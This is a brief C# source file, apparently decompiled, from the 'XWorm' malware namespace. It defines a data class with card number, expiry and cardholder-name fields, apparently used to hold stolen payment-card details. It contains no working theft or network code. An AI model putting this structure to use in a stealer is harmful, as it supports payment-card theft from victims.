namespace XWorm;

public class GClass16 : GClass12
{
	public string sNumber { get; set; }

	public string sExpYear { get; set; }

	public string sExpMonth { get; set; }

	public string sName { get; set; }
}